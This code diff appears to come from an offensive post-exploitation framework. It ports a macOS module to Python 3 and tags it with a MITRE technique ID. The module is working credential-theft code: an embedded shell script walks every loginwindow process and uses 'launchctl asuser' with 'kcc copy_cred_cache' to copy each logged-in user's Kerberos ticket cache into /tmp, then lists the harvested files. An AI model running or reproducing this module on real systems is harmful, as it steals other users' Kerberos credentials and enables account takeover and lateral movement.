@@ -1,7 +1,8 @@
+from builtins import object
 from lib.common import helpers
 
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -16,6 +17,10 @@ class Module:
             # more verbose multi-line description of the module
             'Description': ('This module will dump ccache kerberos'
                             'tickets to the specified directory'),
+
+            'Software': '',
+
+            'Techniques': ['T1208'],
 
             # True if the module needs to run in the background
             'Background': False,
@@ -75,23 +80,23 @@ import subprocess
 kerbdump = \"""
 ps auxwww |grep /loginwindow |grep -v "grep /loginwindow" |while read line
 do
-    USER=`echo "$line" | awk '{print $1}'`
-    PID=`echo "$line" | awk '{print $2}'`
+    USER=`echo "$line" | awk '{print($1)}'`
+    PID=`echo "$line" | awk '{print($2)}'`
     USERID=`id -u "$USER"`
     launchctl asuser $USERID kcc copy_cred_cache /tmp/$USER.ccache
 done
 ""\"
 try:
-    print "Executing..."
+    print("Executing...")
     output = subprocess.Popen(kerbdump, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read()
-    print output
+    print(output)
 except Exception as e:
-    print e
+    print(e)
 try:
-    print "Listing available kerberos files.."
+    print("Listing available kerberos files..")
     output = subprocess.Popen('ls /tmp/*.ccache', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read()
-    print output
+    print(output)
 except Exception as e:
-    print e
+    print(e)
 """
         return script
